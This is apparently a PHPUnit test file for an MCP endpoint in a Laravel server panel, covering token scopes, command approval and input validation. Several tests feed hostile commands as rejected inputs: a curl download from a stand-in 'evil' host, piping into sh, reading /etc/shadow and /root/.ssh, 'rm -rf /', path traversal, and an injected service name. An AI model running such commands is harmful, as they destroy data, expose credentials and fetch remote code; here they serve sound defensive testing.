<?php

namespace Tests\Feature;

use App\Http\Middleware\EnsurePanelSessionIsValid;
use App\Models\CommandJob;
use App\Models\McpAccessToken;
use App\Models\Server;
use App\Models\User;
use App\Models\Website;
use App\Services\ScriptExecutionGateway;
use App\Services\ServerPanel\SshClientService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Queue;
use Illuminate\Support\Facades\Storage;
use Mockery;
use Tests\TestCase;

class McpServerTest extends TestCase
{
    use RefreshDatabase;

    private string $localConfig;

    protected function setUp(): void
    {
        parent::setUp();

        Storage::fake('local');
        Queue::fake();

        $this->localConfig = sys_get_temp_dir().'/mcp-local-'.uniqid().'.conf';
        config(['mcp.local_config_path' => $this->localConfig]);
    }

    protected function tearDown(): void
    {
        @unlink($this->localConfig);

        parent::tearDown();
    }

    public function test_local_host_is_used_when_enabled_and_runs_unprivileged_for_read_tokens(): void
    {
        [$plain] = $this->issueToken('read');
        file_put_contents($this->localConfig, "MCP_LOCAL_EXEC=full\n");

        $this->gateway(315)
            ->shouldReceive('execute')
            ->once()
            ->with('mcp-exec.sh', ['read', '300', 'df -h'])
            ->andReturn(['success' => true, 'ran' => true, 'exit_code' => 0, 'output' => "Filesystem Size\n__DPANEL_MCP_EXIT__=0", 'api_url' => '', 'script_path' => '']);

        $this->callTool($plain, 'run_command', ['command' => 'df -h'])
            ->assertJsonPath('result.isError', false)
            ->assertJsonPath('result.structuredContent.output', 'Filesystem Size')
            ->assertJsonPath('result.structuredContent.exit_code', 0);

        $this->assertDatabaseHas('activity_logs', ['action' => 'mcp.local_command']);
        $this->assertSame(0, CommandJob::query()->count());
    }

    public function test_full_token_runs_as_root_on_a_full_access_host(): void
    {
        [$plain] = $this->issueToken('full');
        file_put_contents($this->localConfig, "MCP_LOCAL_EXEC=full\n");

        $this->gateway(315)
            ->shouldReceive('execute')
            ->once()
            ->with('mcp-exec.sh', ['full', '300', 'systemctl restart nginx'])
            ->andReturn(['success' => true, 'ran' => true, 'exit_code' => 0, 'output' => "boom\n__DPANEL_MCP_EXIT__=1", 'api_url' => '', 'script_path' => '']);

        $this->callTool($plain, 'run_command', ['command' => 'systemctl restart nginx', 'server_id' => 'local'])
            ->assertJsonPath('result.structuredContent.status', 'failed')
            ->assertJsonPath('result.structuredContent.exit_code', 1);
    }

    public function test_restart_is_refused_on_a_read_only_host(): void
    {
        [$plain] = $this->issueToken('full');
        file_put_contents($this->localConfig, "MCP_LOCAL_EXEC=read\n");
        $this->mock(ScriptExecutionGateway::class)->shouldNotReceive('execute');

        $this->callTool($plain, 'restart_service', ['service' => 'nginx'])
            ->assertJsonPath('result.isError', true);
    }

    public function test_local_target_explains_how_to_enable_it(): void
    {
        [$plain] = $this->issueToken();

        $response = $this->callTool($plain, 'run_command', ['command' => 'df -h', 'server_id' => 'local'])
            ->assertJsonPath('result.isError', true);

        $this->assertStringContainsString('sudo dpanel mcp local on', $response->json('result.structuredContent.error'));
    }

    public function test_script_refusal_is_reported_to_the_model(): void
    {
        [$plain] = $this->issueToken('read');
        file_put_contents($this->localConfig, "MCP_LOCAL_EXEC=read\n");

        $this->gateway()
            ->shouldReceive('execute')
            ->andReturn(['success' => false, 'ran' => true, 'exit_code' => 500, 'output' => json_encode(['success' => false, 'message' => 'Failed: /x/mcp-exec.sh failed with status exit status: 1: [mcp-exec] Local MCP commands are off on this host.']), 'api_url' => '', 'script_path' => '']);

        $response = $this->callTool($plain, 'run_command', ['command' => 'uptime']);

        $response->assertJsonPath('result.isError', true);
        $this->assertStringContainsString('Local MCP commands are off on this host.', $response->json('result.structuredContent.error'));
    }

    public function test_requests_without_a_valid_token_are_rejected(): void
    {
        $this->postJson('/api/mcp', $this->rpc('ping'))->assertStatus(401);

        $response = $this->postJson('/api/mcp', $this->rpc('ping'), ['Authorization' => 'Bearer dp-mcp-wrong'])
            ->assertStatus(401)
            ->assertJsonPath('error.code', -32001);

        $this->assertStringContainsString('/.well-known/oauth-protected-resource/api/mcp"', (string) $response->headers->get('WWW-Authenticate'));
    }

    public function test_token_stops_working_when_owner_is_no_longer_admin(): void
    {
        [$plain, $token] = $this->issueToken();
        $token->user->forceFill(['role' => 'general'])->save();

        $this->mcp($plain, 'ping')->assertStatus(401);
    }

    public function test_expired_and_disabled_tokens_are_rejected(): void
    {
        [$plain, $token] = $this->issueToken();

        $token->update(['expires_at' => now()->subMinute()]);
        $this->mcp($plain, 'ping')->assertStatus(401);

        $token->update(['expires_at' => null, 'is_active' => false]);
        $this->mcp($plain, 'ping')->assertStatus(401);
    }

    public function test_initialize_negotiates_protocol_and_advertises_tools(): void
    {
        [$plain] = $this->issueToken();

        $this->mcp($plain, 'initialize', ['protocolVersion' => '2025-03-26', 'capabilities' => new \stdClass, 'clientInfo' => ['name' => 'test', 'version' => '1']])
            ->assertOk()
            ->assertJsonPath('result.protocolVersion', '2025-03-26')
            ->assertJsonPath('result.serverInfo.name', 'dpanel')
            ->assertJsonPath('result.capabilities.tools.listChanged', false);

        $this->mcp($plain, 'initialize', ['protocolVersion' => '1999-01-01'])
            ->assertJsonPath('result.protocolVersion', '2025-06-18');
    }

    public function test_notifications_get_202_without_body(): void
    {
        [$plain] = $this->issueToken();

        $this->withHeaders(['Authorization' => 'Bearer '.$plain])
            ->postJson('/api/mcp', ['jsonrpc' => '2.0', 'method' => 'notifications/initialized'])
            ->assertStatus(202);
    }

    public function test_get_is_not_supported(): void
    {
        [$plain] = $this->issueToken();

        $this->withHeaders(['Authorization' => 'Bearer '.$plain])->get('/api/mcp')->assertStatus(405);
    }

    public function test_unknown_method_returns_json_rpc_error(): void
    {
        [$plain] = $this->issueToken();

        $this->mcp($plain, 'does/not/exist')->assertOk()->assertJsonPath('error.code', -32601);
    }

    public function test_tools_list_contains_diagnostic_tools(): void
    {
        [$plain] = $this->issueToken();

        $names = collect($this->mcp($plain, 'tools/list')->assertOk()->json('result.tools'))->pluck('name');

        foreach (['get_panel_overview', 'list_websites', 'get_website', 'check_website', 'list_dns_records', 'list_databases', 'list_cron_jobs', 'get_mail_status', 'list_backups', 'list_security_findings', 'analyze_disk_usage', 'read_service_logs', 'run_command', 'restart_service'] as $tool) {
            $this->assertContains($tool, $names);
        }
    }

    public function test_list_websites_returns_sites(): void
    {
        [$plain] = $this->issueToken();
        Website::query()->create(['id' => 'site-1', 'domain' => 'example.com', 'status' => 'active', 'type' => 'primary', 'php_version' => '8.3']);

        $response = $this->callTool($plain, 'list_websites', ['search' => 'example']);

        $response->assertJsonPath('result.isError', false)
            ->assertJsonPath('result.structuredContent.total', 1)
            ->assertJsonPath('result.structuredContent.websites.0.domain', 'example.com');
    }

    public function test_overview_returns_alerts_and_cpu_details(): void
    {
        [$plain] = $this->issueToken();

        $this->callTool($plain, 'get_panel_overview', [])
            ->assertJsonPath('result.isError', false)
            ->assertJsonStructure(['result' => ['structuredContent' => ['alerts', 'cpu_cores', 'failed_units', 'top_cpu_processes']]]);
    }

    public function test_dns_records_come_with_site_and_mail_checks(): void
    {
        [$plain] = $this->issueToken();
        $zone = \App\Models\DnsZone::query()->create(['id' => 'zone-1', 'domain' => 'example.com', 'status' => 'active']);
        $zone->records()->createMany([
            ['id' => 'r-1', 'type' => 'A', 'name' => '@', 'content' => '203.0.113.5', 'ttl' => 300, 'is_active' => true],
            ['id' => 'r-2', 'type' => 'TXT', 'name' => '@', 'content' => '"v=spf1 mx -all"', 'ttl' => 300, 'is_active' => true],
            ['id' => 'r-3', 'type' => 'TXT', 'name' => '@', 'content' => 'v=spf1 a -all', 'ttl' => 300, 'is_active' => true],
        ]);

        $checks = $this->callTool($plain, 'list_dns_records', ['domain' => 'www.example.com'])
            ->assertJsonPath('result.isError', false)
            ->assertJsonPath('result.structuredContent.zone', 'example.com')
            ->json('result.structuredContent.checks');

        $this->assertContains('ok: apex has an address record', $checks);
        $this->assertContains('missing: no MX record (mail to this domain will not arrive)', $checks);
        $this->assertContains('error: more than one SPF record (receivers treat that as no SPF)', $checks);
        $this->assertContains('missing: no DMARC record at _dmarc', $checks);
    }

    public function test_databases_never_include_passwords(): void
    {
        [$plain] = $this->issueToken();
        \App\Models\DatabaseRequest::query()->create(['id' => 'db-1', 'domain' => 'example.com', 'database_name' => 'shop', 'database_user' => 'shop_u', 'database_password' => 'secret-pass', 'status' => 'active']);

        $response = $this->callTool($plain, 'list_databases', ['search' => 'shop'])
            ->assertJsonPath('result.structuredContent.total', 1)
            ->assertJsonPath('result.structuredContent.databases.0.name', 'shop');

        $this->assertStringNotContainsString('secret-pass', $response->getContent());
    }

    public function test_backups_summarize_failures_and_last_success(): void
    {
        [$plain] = $this->issueToken();
        \App\Models\Backup::query()->forceCreate(['id' => 'b-1', 'name' => 'nightly', 'type' => 'full', 'status' => 'completed', 'created_at' => now()->subHours(6), 'completed_at' => now()->subHours(5)]);
        \App\Models\Backup::query()->forceCreate(['id' => 'b-2', 'name' => 'nightly', 'type' => 'full', 'status' => 'failed', 'error_message' => 'disk full']);

        $this->callTool($plain, 'list_backups', [])
            ->assertJsonPath('result.structuredContent.summary.failed_last_7d', 1)
            ->assertJsonPath('result.structuredContent.summary.hours_since_last_success', 5)
            ->assertJsonPath('result.structuredContent.backups.0.error', 'disk full');
    }

    public function test_unknown_website_is_a_tool_error_not_a_protocol_error(): void
    {
        [$plain] = $this->issueToken();

        $this->callTool($plain, 'get_website', ['domain' => 'missing.test'])
            ->assertOk()
            ->assertJsonPath('result.isError', true);
    }

    public function test_safe_command_runs_and_is_recorded(): void
    {
        [$plain] = $this->issueToken();
        $server = $this->server();
        $this->fakeSsh('Filesystem  Size  Used', 'df -h');

        $this->callTool($plain, 'run_command', ['command' => 'df -h'])
            ->assertJsonPath('result.isError', false)
            ->assertJsonPath('result.structuredContent.status', 'success')
            ->assertJsonPath('result.structuredContent.output', 'Filesystem  Size  Used');

        $job = CommandJob::query()->firstOrFail();
        $this->assertSame($server->id, $job->server_id);
        $this->assertContains('mcp', $job->tags);
    }

    public function test_read_only_token_refuses_mutating_and_chained_commands(): void
    {
        [$plain] = $this->issueToken('read');
        $this->server();
        $this->mock(SshClientService::class)->shouldNotReceive('executeOnServer');

        foreach (['systemctl restart nginx', 'date -s 2020-01-01', 'ip route add 10.0.0.0/8 dev lo', 'ps aux; rm -rf /tmp/x', 'ls; curl http://evil -o /tmp/x', "ls\ncurl http://evil -o /tmp/x", 'ls | sh', 'ls || id', 'cat /etc/shadow', 'ls -la /root/.ssh', 'whoami && id', 'ls $(id)'] as $command) {
            $this->callTool($plain, 'run_command', ['command' => $command])
                ->assertJsonPath('result.isError', true);
        }

        $this->callTool($plain, 'restart_service', ['service' => 'nginx'])
            ->assertJsonPath('result.isError', true);

        $this->assertSame(0, CommandJob::query()->count());
    }

    public function test_read_only_token_may_pipe_into_filters(): void
    {
        [$plain] = $this->issueToken('read');
        $this->server();
        $this->fakeSsh('error line');

        $this->callTool($plain, 'run_command', ['command' => 'journalctl -u nginx -n 50 | grep error'])
            ->assertJsonPath('result.isError', false);
    }

    public function test_read_only_token_may_run_extra_diagnostics(): void
    {
        [$plain] = $this->issueToken('read');
        $this->server();
        $this->mock(SshClientService::class)
            ->shouldReceive('executeOnServer')
            ->times(3)
            ->andReturn(['output' => 'ok', 'error_output' => '', 'exit_code' => 0]);

        foreach (['ps aux --sort=-%mem | head -20', 'systemctl show mariadb --property=MemoryCurrent', 'du -sh /var/www'] as $command) {
            $this->callTool($plain, 'run_command', ['command' => $command])
                ->assertJsonPath('result.isError', false);
        }
    }

    public function test_full_token_runs_mutating_command_with_recorded_approval(): void
    {
        [$plain, $token] = $this->issueToken('full');
        $this->server();
        $this->fakeSsh('', 'systemctl restart nginx');

        $this->callTool($plain, 'run_command', ['command' => 'systemctl restart nginx'])
            ->assertJsonPath('result.isError', false);

        $job = CommandJob::query()->firstOrFail();
        $this->assertSame('approval_required', $job->risk_level);
        $this->assertSame($token->user_id, $job->approved_by);
        $this->assertDatabaseHas('activity_logs', ['action' => 'mcp.tool_called']);
    }

    public function test_blocked_commands_are_refused_even_with_full_token(): void
    {
        [$plain] = $this->issueToken('full');
        $this->server();
        $this->mock(SshClientService::class)->shouldNotReceive('executeOnServer');

        $this->callTool($plain, 'run_command', ['command' => 'rm -rf /'])
            ->assertJsonPath('result.isError', true);
    }

    public function test_read_log_file_rejects_paths_outside_var_log(): void
    {
        [$plain] = $this->issueToken();
        $this->server();
        $this->mock(SshClientService::class)->shouldNotReceive('executeOnServer');

        foreach (['/etc/passwd', '/var/log/../../etc/shadow', 'var/log/syslog'] as $path) {
            $this->callTool($plain, 'read_log_file', ['path' => $path])
                ->assertJsonPath('result.isError', true);
        }
    }

    public function test_service_tools_validate_unit_names(): void
    {
        [$plain] = $this->issueToken();
        $this->server();
        $this->mock(SshClientService::class)->shouldNotReceive('executeOnServer');

        $this->callTool($plain, 'read_service_logs', ['service' => 'nginx; rm -rf /'])
            ->assertJsonPath('result.isError', true);
    }

    public function test_admin_can_issue_token_from_panel(): void
    {
        $admin = User::factory()->create(['role' => 'admin']);

        $response = $this->withoutMiddleware(EnsurePanelSessionIsValid::class)->withSession(['panel_session_token' => str_repeat('a', 64)])->actingAs($admin)->postJson(route('mcp.tokens.store', ['token' => str_repeat('a', 64)]), [
            'name' => 'Laptop',
            'scope' => 'read',
        ])->assertOk();

        $plain = $response->json('plain_token');
        $this->assertStringStartsWith('dp-mcp-', $plain);
        $this->assertDatabaseHas('mcp_access_tokens', ['name' => 'Laptop', 'token_hash' => hash('sha256', $plain)]);
    }

    public function test_non_admin_cannot_issue_tokens(): void
    {
        $user = User::factory()->create(['role' => 'general']);

        $this->withoutMiddleware(EnsurePanelSessionIsValid::class)->withSession(['panel_session_token' => str_repeat('a', 64)])->actingAs($user)
            ->postJson(route('mcp.tokens.store', ['token' => str_repeat('a', 64)]), ['name' => 'x', 'scope' => 'full'])
            ->assertForbidden();

        $this->assertDatabaseCount('mcp_access_tokens', 0);
    }

    /**
     * @return array{0: string, 1: McpAccessToken}
     */
    private function issueToken(string $scope = 'read'): array
    {
        $user = User::factory()->create(['role' => 'admin']);
        $generated = McpAccessToken::generate();

        $token = McpAccessToken::query()->create([
            'user_id' => $user->id,
            'name' => 'test',
            'token_prefix' => $generated['prefix'],
            'token_hash' => $generated['hash'],
            'scope' => $scope,
        ]);

        return [$generated['plain'], $token->fresh('user')];
    }

    private function gateway(?int $timeout = null): Mockery\MockInterface
    {
        $gateway = $this->mock(ScriptExecutionGateway::class);
        $gateway->shouldReceive('withTimeout')->with($timeout ?? Mockery::any())->andReturnSelf();

        return $gateway;
    }

    private function server(): Server
    {
        return Server::query()->create([
            'name' => 'Test Host',
            'host' => '127.0.0.1',
            'port' => 22,
            'username' => 'root',
            'auth_type' => 'password',
            'encrypted_password' => 'Password123!',
            'mode' => 'setup',
            'status' => 'online',
        ]);
    }

    private function fakeSsh(string $output, ?string $expectedCommand = null): void
    {
        $this->mock(SshClientService::class)
            ->shouldReceive('executeOnServer')
            ->once()
            ->with(Mockery::type(Server::class), $expectedCommand ?? Mockery::any())
            ->andReturn(['output' => $output, 'error_output' => '', 'exit_code' => 0]);
    }

    private function rpc(string $method, array $params = []): array
    {
        return ['jsonrpc' => '2.0', 'id' => 1, 'method' => $method, 'params' => $params === [] ? new \stdClass : $params];
    }

    private function mcp(string $plain, string $method, array $params = []): \Illuminate\Testing\TestResponse
    {
        return $this->withHeaders(['Authorization' => 'Bearer '.$plain])->postJson('/api/mcp', $this->rpc($method, $params));
    }

    private function callTool(string $plain, string $name, array $arguments): \Illuminate\Testing\TestResponse
    {
        return $this->mcp($plain, 'tools/call', ['name' => $name, 'arguments' => $arguments]);
    }
}
